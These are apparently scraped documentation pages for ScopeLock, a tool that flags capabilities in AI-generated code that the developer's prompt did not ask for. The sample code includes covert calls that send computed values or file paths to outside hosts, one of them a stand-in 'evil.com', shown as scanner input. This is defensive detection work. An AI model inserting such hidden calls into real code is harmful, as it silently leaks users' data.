docs.title: Never let AI code do more than you asked for.
docs.text:
Zero-Trust Security & Capability-Divergence Gate for AI-Generated Software

ScopeLock bridges the semantic intent gap — the dangerous disconnect between what you asked an AI to build and what it actually built. Using deterministic Tree-sitter AST analysis, it catches unjustified capability over-reach that traditional linters completely miss.

🚀 Get Started 📖 CLI Reference 📊 Benchmark Results

docs.title: 🔥 The Problem
docs.text:
You ask an AI to build a local offline calculator. It generates this:

AI-Generated Code
function calculateTotal(price, taxRate) {
  const subtotal = price * (1 + taxRate);

  // Quietly added by the AI — you never asked for this
  fetch("https://analytics.tracker.org/log?val=" + subtotal);

  return subtotal;
}

Traditional linters find zero errors. fetch() is syntactically valid. ESLint, SonarQube, and CodeQL have no idea you only wanted arithmetic.

ScopeLock catches it instantly:

$ scopelock scan app.js --prompt "Build a local offline calculator"

docs.title: ScannerEngine
docs.text:
Scan code strings or files and extract observed capabilities.

from scopelock.scanner.engine import ScannerEngine

scanner = ScannerEngine()

# Scan a JavaScript code string
caps, latency_ms = scanner.scan_code(
    code="fetch('https://evil.com')",
    file_name="snippet.js"
)

# Scan a file on disk
caps, latency_ms = scanner.scan_file("path/to/app.py")

print(f"Found {len(caps)} capabilities in {latency_ms:.2f}ms")
for cap in caps:
    print(f"  {cap.category.value} — {cap.raw_call} @ line {cap.source_location.line}")

docs.title: IntentDecomposer
docs.text:
Convert a natural language prompt into a ScopePolicy.

from scopelock.core.intent_engine import IntentDecomposer

policy = IntentDecomposer.decompose(
    prompt="Build a local offline arithmetic calculator"
)

print(policy.allowed_categories)    # set()
print(policy.disallowed_categories) # {NETWORK, FILESYSTEM, PROCESS, ...}
print(policy.is_ambiguous)          # False

# Force offline (skip LLM even if API key is set):
policy = IntentDecomposer.decompose(prompt="...", force_offline=True)

docs.title: CapabilityAligner
docs.text:
Compare observed capabilities against a policy to produce an audit report.

from scopelock.core.aligner import CapabilityAligner

report = CapabilityAligner.align(
    policy=policy,
    observed_caps=caps,
    target_file="app.js",
    latency_ms=latency_ms
)

print(report.final_verdict)        # AuditVerdict.FAILED or PASSED
print(report.total_violations)     # int
for finding in report.findings:
    print(f"{finding.verdict.value}: {finding.finding}")

docs.title: Full Pipeline Example
docs.text:
from scopelock.scanner.engine import ScannerEngine
from scopelock.core.intent_engine import IntentDecomposer
from scopelock.core.aligner import CapabilityAligner
from scopelock.core.reporter import ReportFormatter
from scopelock.core.schema import AuditVerdict

def audit(code: str, prompt: str, lang: str = "js") -> bool:
    """Returns True if code passes, False if violations detected."""
    scanner = ScannerEngine()
    caps, latency = scanner.scan_code(code, file_name=f"snippet.{lang}")

    policy = IntentDecomposer.decompose(prompt)
    report = CapabilityAligner.align(policy, caps, latency_ms=latency)

    print(ReportFormatter.to_terminal(report))
    return report.final_verdict == AuditVerdict.PASSED


# Example usage:
code = """
function calcTotal(price, tax) {
    fetch("https://evil.com");  // Injected
    return price * (1 + tax);
}
"""

passed = audit(code, "Build a local arithmetic calculator", "js")
if not passed:
    raise SystemExit("Security violation detected — deployment blocked")

docs.title: Data Models
docs.text:
All models are Pydantic v2 BaseModel subclasses, fully typed and serializable:

from scopelock.core.schema import (
    AuditReport,       # Final audit output
    AuditVerdict,      # PASSED / FAILED / NEEDS_REVIEW
    ScopePolicy,       # Expected capability contract
    DivergenceFinding, # Individual finding with risk score
    ObservedCapability,# Capability detected in code
    SourceLocation,    # File + line + column
    RiskTier,          # JUSTIFIED / UNJUSTIFIED / SUSPICIOUS / AMBIGUOUS
)

from scopelock.core.taxonomy import (
    CapabilityCategory, # NETWORK / FILESYSTEM / PROCESS / SECRET / DATABASE / RUNTIME

The benchmark evaluates ScopeLock against 25 representative programs:

  • 14 capability-injected programs — Clean programs with added over-reach (expected result: FAIL)

Each program covers a real-world AI codegen scenario:

Why linters score 0%

ESLint, SonarQube, and CodeQL inspect code for syntax errors and known CVE patterns. They find no errors because fetch(), subprocess.run(), and process.env are syntactically valid. ScopeLock uniquely evaluates whether these APIs are justified by the developer's intent.

docs.text: Install an automated Git pre-commit security hook that runs ScopeLock before every git commit, preventing capability over-reach from being committed to the repository.

docs.title: Synopsis
docs.text:
scopelock init-hooks

Requirements

This command must be run from the root of a Git repository (directory containing .git/).

docs.title: What It Does
docs.text:
Creates a pre-commit hook script at .git/hooks/pre-commit that:

  1. Runs scopelock scan-project . before every commit
  2. Blocks the commit if any unjustified capabilities are detected
  3. Shows exactly which files and lines caused the violation

docs.title: Usage
docs.text:
# In your Git repository root:
scopelock init-hooks

[OK] ScopeLock Git pre-commit hook installed in .git/hooks/pre-commit!
Every 'git commit' will now automatically verify code against least privilege.

Now try to commit a file with a violation:

git add app.js
git commit -m "Add calculator"

# Output:
[ScopeLock] Running Zero-Trust Capability Audit...
[FAIL] app.js — NETWORK.fetch detected (unjustified)
[ScopeLock] Commit rejected: Unjustified capabilities detected.

The commit is blocked automatically.

docs.title: Manual Bypass (Emergency Only)
docs.text:
git commit --no-verify -m "Emergency fix"

Use --no-verify sparingly

Bypassing the hook defeats the purpose of zero-trust enforcement. Only use for genuine emergencies and follow up with a manual audit.

docs.title: Divergence Scoring
docs.text: The Zero-Trust Divergence Engine computes the capability divergence set Δ and assigns risk scores to each finding.

docs.title: The Formula
docs.text:
Δ = C_obs \ C_exp
Symbol Meaning C_obs Set of capabilities observed in code via AST analysis C_exp Set of capabilities expected by developer intent (from ScopePolicy) Δ Divergence set — capabilities in C_obs not in C_exp

If Δ = ∅ (empty), the code has exactly the permissions it needs → PASSED If |Δ| > 0, capability over-reach is detected → FAILED

docs.title: Verdict Tiers
docs.text:
Each finding receives one of five verdicts:

Verdict Risk Score Meaning Audit Result JUSTIFIED 0.0 Capability is authorized by intent ✅ PASS CONDITIONALLY_JUSTIFIED 0.1–0.4 Permitted category but conditional ✅ PASS SUSPICIOUS 0.5–0.65 Target scope exceeds declared scope ⚠️ FAIL UNJUSTIFIED 0.75–0.95 Capability not authorized at all ❌ FAIL AMBIGUOUS 0.5 Intent was too vague to evaluate 🔄 NEEDS_REVIEW

docs.title: Risk Score Breakdown
docs.text:
For UNJUSTIFIED findings, scores are assigned by category:

Category Score Rationale PROCESS 0.95 Shell execution is highest risk — enables RCE SECRET 0.95 Credential access enables supply-chain attacks NETWORK 0.95 Data exfiltration / C2 callbacks DATABASE 0.75 Data leakage but scope-limited FILESYSTEM 0.75 Data theft potential RUNTIME 0.75 Dynamic eval risks

docs.title: Final Verdict Logic
docs.text:
violations = [f for f in findings if f.verdict in (UNJUSTIFIED, SUSPICIOUS)]
final_verdict = FAILED if violations else PASSED

Both UNJUSTIFIED and SUSPICIOUS findings count as violations. Only JUSTIFIED findings produce a PASS.

docs.title: LLM Decomposer (Enhanced Mode)

When OPENAI_API_KEY is set, ScopeLock uses GPT-4o-mini with structured output (JSON schema enforcement) to parse intent:

# The LLM receives this system prompt:
"You are a formal security analyst. Convert the natural language requirement
into a strict capability policy. Do not hallucinate permissions.
If an offline utility is requested, allow zero permissions."

The response is validated against the ScopePolicy Pydantic schema — the LLM cannot invent new fields or permission types.

Fallback: If the API call fails for any reason, ScopeLock transparently falls back to the heuristic engine. You are never blocked.

docs.title: Writing Better Prompts
docs.text:
The more specific your @intent: annotation, the more accurate the policy:

❌ Vague ✅ Specific "Calculator app" "Local arithmetic calculator — no network or file access" "File utility" "Read local CSV file and return parsed rows" "Weather app" "Fetch live weather from OpenWeatherMap REST API for a given city" "Auth module" "Authenticate users via JWT — reads from PostgreSQL, no subprocess"

docs.title: The Core Problem
docs.text:
Modern AI coding assistants (GitHub Copilot, Cursor, Devin, Claude Code) generate code that is syntactically correct and functionally working — but frequently acquires execution authority that was never requested.

This is the Semantic Intent Gap: the difference between what a developer asked for and what the AI actually built.

docs.title: A Concrete Example
docs.text:
Developer Prompt: "Build a local addition calculator"

AI-Generated Code:

function calculateTotal(price, taxRate) {
    const subtotal = price * (1 + taxRate);

    // Never requested — silently injected by the AI
    fetch("https://analytics.tracker.org/log?val=" + subtotal);

    return subtotal;
}

The code works perfectly as a calculator. But it also silently exfiltrates computation results to an external server.

docs.title: Why Traditional Tools Fail
docs.text:
Tool Approach Result ESLint Syntax rules + known bad patterns ✅ fetch() is valid JS → 0 errors SonarQube Code quality + CVE database ✅ No known CVE match → 0 errors CodeQL Data flow + taint analysis ✅ No user-controlled input → 0 errors Snyk Dependency vulnerabilities ✅ No vulnerable package → 0 errors

None of these tools know that you only wanted local arithmetic. They have no concept of developer intent.

docs.title: The ScopeLock Approach
docs.text:
ScopeLock formalizes the problem as a set-theoretic capability divergence:

Δ = C_obs \ C_exp

Where: - C_obs — Capabilities observed in the code (via AST analysis) - C_exp — Capabilities expected from the developer's intent (via prompt decomposition) - Δ — The divergence set — capabilities that were never authorized

If Δ ≠ ∅, the code has acquired more authority than it was asked to.

docs.title: Formal Model
docs.text:
flowchart LR
    A["Developer Prompt
'Local arithmetic calculator'"] --> B["Intent Decomposer
C_exp = {FS:NONE, NET:NONE}"]
    C["AI-Generated Code
fetch(), arithmetic ops"] --> D["AST Scanner
C_obs = {NET.fetch, MATH}"]
    B --> E["Aligner
Δ = C_obs \ C_exp"]
    D --> E
    E --> F["Δ = {NET.fetch}
VIOLATION DETECTED"]

docs.title: Why This Matters
docs.text:
As AI code generation becomes ubiquitous, the attack surface expands dramatically:

  • Supply chain attacks — AI tools inject telemetry, backdoors, or C2 callbacks
  • Permission creep — Small over-reach accumulates into large security debt
  • Shadow capabilities — Developers don't realize what permissions their code holds
  • Audit failures — Security reviews based on linters give false confidence

ScopeLock is the first tool to close this gap with a prompt-aware, intent-grounded security gate.

docs.title: Capability Taxonomy
docs.text: ScopeLock classifies all detected API calls into 6 capability categories, each representing a distinct class of system authority.

docs.title: 🌐 NETWORK
docs.text:
Capabilities that establish communication with external systems.

Action APIs (JS) APIs (Python) NET_HTTP_GET axios.get(), https.get() requests.get(), httpx.get() NET_HTTP_POST axios.post() requests.post() NET_REQUEST fetch(), http.request() urllib.request.urlopen() NET_SOCKET new WebSocket() socket.socket()

Risk when unjustified: Data exfiltration, C2 callbacks, telemetry injection

docs.title: 📁 FILESYSTEM
docs.text:
Capabilities that read, write, or delete local files.

Action APIs (JS) APIs (Python) FS_READ fs.readFile(), fs.readFileSync() open() FS_WRITE fs.writeFile(), fs.mkdir() — FS_DELETE fs.unlink(), fs.rmdir() os.remove(), shutil.rmtree()

Risk when unjustified: Data theft, config tampering, log manipulation

docs.title: ⚙️ PROCESS
docs.text:
Capabilities that spawn child processes or execute shell commands.

Action APIs (JS) APIs (Python) PROC_EXEC child_process.exec(), execSync() os.system(), subprocess.run() PROC_SPAWN child_process.spawn() subprocess.Popen()

Risk when unjustified: Remote code execution, privilege escalation, backdoors

docs.title: 🔑 SECRET
docs.text:
Capabilities that access environment variables or credentials.

Action APIs (JS) APIs (Python) SECRET_READ_ENV process.env.KEY os.environ, os.getenv() SECRET_READ_CRED — —

Risk when unjustified: API key theft, credential harvesting

docs.title: 🗄️ DATABASE
docs.text:
Capabilities that connect to or query databases.

Action APIs (JS) APIs (Python) DB_CONNECT sqlite3.Database sqlite3.connect, psycopg2.connect, pymysql.connect DB_QUERY client.query, connection.query, db.query, pool.query sqlite3.execute, cursor.execute, connection.execute

Note: Database detection is rule-based and reports common connection and query APIs.

docs.title: 🔄 RUNTIME
docs.text:
Capabilities that execute dynamic or arbitrary code.

Action APIs (JS) APIs (Python) RUNTIME_EVAL eval(), new Function() eval(), exec() RUNTIME_DYNAMIC_IMPORT — importlib.import_module()

Risk when unjustified: Code injection, sandbox escape, unpredictable behavior

docs.title: Risk Scoring
docs.text:
Each detected capability receives a risk score (0.0 – 1.0):

Verdict Score Range Meaning JUSTIFIED 0.0 Capability aligns with intent CONDITIONALLY_JUSTIFIED 0.1 – 0.4 Permitted but scope exceeds declaration SUSPICIOUS 0.5 – 0.7 Needs review UNJUSTIFIED 0.75 – 0.95 Direct policy violation

High-impact categories (PROCESS, SECRET, NETWORK) receive the maximum score of 0.95 when unjustified.

docs.title: Your First Audit — Step by Step

docs.title: The Scenario
docs.text:
You asked GitHub Copilot to build a CSV file reader. The AI returned the following code:

csv_reader.py
# @intent: Read local CSV file and parse rows into a list of dicts
import csv
import requests  # 🚨 You never asked for this

def read_csv(filepath: str) -> list[dict]:
    # Unexpected: telemetry ping before reading
    requests.post("https://telemetry.ai-tool.com/usage", json={"file": filepath})

    with open(filepath, "r") as f:
        reader = csv.DictReader(f)
        return list(reader)

Two things happened: 1. open() — Justified: you asked for a file reader 2. requests.post() — Unjustified: telemetry you never requested

scopelock scan csv_reader.py --prompt "Read local CSV file and parse rows into a list of dicts"

Or scan the whole project (auto-extracts @intent comments):

Create a file called app.js with the following content — a calculator that has a hidden network call injected by an AI model:

  fetch("https://analytics.tracker.org/log?val=" + subtotal);

docs.title: In-Code Intent Annotations
docs.text: Declare your intent directly inside source code comments using the @intent: annotation. ScopeLock automatically extracts these during project scans — no --prompt flag required.

docs.title: Syntax
Where to Place It
docs.text:
Place the @intent: annotation in the first 25 lines of the file, ideally at the very top:

JavaScriptTypeScriptPython src/utils/calculator.js
// @intent: Local arithmetic calculator — compute price with tax, no network or file access

function calculateTotal(price, taxRate) {
    return price * (1 + taxRate);
}

module.exports = { calculateTotal };
src/api/weather.ts
// @intent: Fetch current weather from OpenWeatherMap API for a given city name

import axios from 'axios';

export async function getWeather(city: string): Promise<object> {
    const res = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${city}`);
    return res.data;
}
src/data/csv_reader.py
# @intent: Read a local CSV file and return rows as a list of dictionaries

import csv

def read_csv(filepath: str) -> list[dict]:
    with open(filepath, "r") as f:
        return list(csv.DictReader(f))

docs.title: How ScopeLock Reads It
docs.text:
When you run scopelock scan-project ./src, ScopeLock:

  1. Scans the first 25 lines of each file for an @intent: pattern
  2. Extracts the intent text after the colon
  3. Passes it to the Intent Decomposer Engine to produce a ScopePolicy
  4. Compares the policy against observed capabilities
[SCAN] src/utils/calculator.js
  Intent found: "Local arithmetic calculator — compute price with tax, no network or file access"
  Policy: NET=DENY, FS=DENY, PROC=DENY
  Observed: [fetch() at L4] → UNJUSTIFIED ❌

docs.title: Priority Order
docs.text:
When multiple intent sources exist, ScopeLock uses this priority:

@intent: annotation (highest priority)
    ↓
scopelock.json policy file
    ↓
Inferred from filename (lowest priority)

docs.title: Good Intent Examples
docs.text: Use Case Good @intent: Calculator Local arithmetic calculator — pure computation, offline only CSV reader Read a local CSV file and return rows as structured data Weather app Fetch live weather from OpenWeatherMap API for a city Auth module Authenticate users via JWT tokens against PostgreSQL database Markdown formatter Format raw text into GitHub Markdown — no external calls needed Shell script runner Execute shell commands to manage system processes

docs.title: Bad Intent Examples (Too Vague)
docs.text:
Avoid ambiguous intent

These trigger ScopeLock's ambiguity detection and may force NEEDS_REVIEW status:

  • ❌ "General utility tool"
  • ❌ "Manage my stuff"
  • ❌ "System tool"
  • ❌ "Do whatever is needed"

Be specific about what the module does and what it accesses.

docs.title: GitHub Actions Integration
docs.text: Integrate ScopeLock into your GitHub CI/CD pipeline to automatically block pull requests that introduce unjustified capability over-reach.

docs.title: Quick Setup
docs.text:
Add this to your workflow file:

.github/workflows/scopelock.yml
name: ScopeLock Capability Audit

on:
  push:
    branches: [main, master]
  pull_request:
    branches: [main, master]

jobs:
  scopelock-audit:
    name: Zero-Trust Capability Gate
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install ScopeLock
        run: pip install scopelock

      - name: Run Capability Audit
        run: scopelock scan-project ./src
        # Exit code 1 automatically fails the job → blocks the PR

docs.title: Full Enterprise Setup (with SARIF)
docs.text:
This workflow audits your code and uploads results to GitHub's Security tab:

.github/workflows/scopelock-enterprise.yml
name: ScopeLock Enterprise Audit

on:
  push:
    branches: [main]
  pull_request:

jobs:
  capability-audit:
    name: Capability Divergence Gate
    runs-on: ubuntu-latest
    permissions:
      security-events: write   # Required for SARIF upload
      contents: read

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install ScopeLock
        run: pip install scopelock

      - name: Run Audit (Terminal Output)
        run: scopelock scan-project ./src

      - name: Generate SARIF Report
        if: always()   # Run even if previous step failed
        run: |
          scopelock scan app.js \
            --prompt "$(cat .scopelock-intent.txt)" \
            --sarif > scopelock.sarif

      - name: Upload to GitHub Security Tab
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: scopelock.sarif
          category: scopelock

After setup, violations appear in: GitHub Repo → Security → Code scanning alerts

docs.title: Scan Only Changed Files (PR-Optimized)
docs.text:
For large repositories, scan only files changed in the PR:

      - name: Get changed files
        id: changed
        uses: tj-actions/changed-files@v44
        with:
          files: |
            **/*.js
            **/*.ts
            **/*.py

      - name: Audit changed files
        if: steps.changed.outputs.any_changed == 'true'
        run: |
          for file in ${{ steps.changed.outputs.all_changed_files }}; do
            scopelock scan "$file" --prompt "$(git log -1 --pretty=%B)" --sarif >> results.sarif
          done

docs.title: Pre-commit Hooks
docs.text: Prevent unjustified capability over-reach from ever being committed to your repository.

docs.title: Option 1: ScopeLock Native Hook
docs.text:
scopelock init-hooks

This installs a shell script at .git/hooks/pre-commit that runs scopelock scan-project . before every commit.

See the init-hooks command reference for details.

docs.title: Option 2: pre-commit Framework (Recommended for Teams)
docs.text: The pre-commit framework manages hooks declaratively and makes it easy for the whole team to use the same hooks.

docs.title: Setup
docs.text:
pip install pre-commit

Add ScopeLock to your .pre-commit-config.yaml:

.pre-commit-config.yaml
repos:
  # ... your existing hooks ...

  - repo: local
    hooks:
      - id: scopelock
        name: ScopeLock — Zero-Trust Capability Audit
        entry: scopelock scan-project
        args: ["."]
        language: python
        additional_dependencies: [scopelock]
        pass_filenames: false
        always_run: true
        stages: [commit]

Install the hooks:

pre-commit install

Now every git commit runs ScopeLock automatically.

docs.title: Test manually
docs.text: pre-commit run scopelock --all-files

docs.title: How It Works
docs.text:
When you run git commit:

$ git commit -m "Add calculator feature"

Fix the violations above, then re-commit.

The commit is blocked. Fix the violation, then try again.
